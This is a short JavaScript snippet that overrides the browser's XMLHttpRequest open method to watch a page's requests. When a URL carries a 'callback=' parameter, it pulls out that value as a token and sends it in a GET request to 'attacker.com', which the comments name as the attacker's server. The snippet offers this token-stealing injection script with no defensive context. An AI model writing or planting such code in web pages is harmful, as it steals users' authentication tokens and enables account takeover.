// Intercepting HTTP requests
(function() {
    var open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        this.addEventListener('load', function() {
            // Check if the URL contains the callback parameter
            if (url.includes('callback=')) {
                // Extract the token from the callback parameter
                var token = decodeURIComponent(url.split('callback=')[1]);
                // Send the token to the attacker's server
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://attacker.com/?token=' + token);
                xhr.send();
            }
        });
        open.apply(this, arguments);
    };
})();
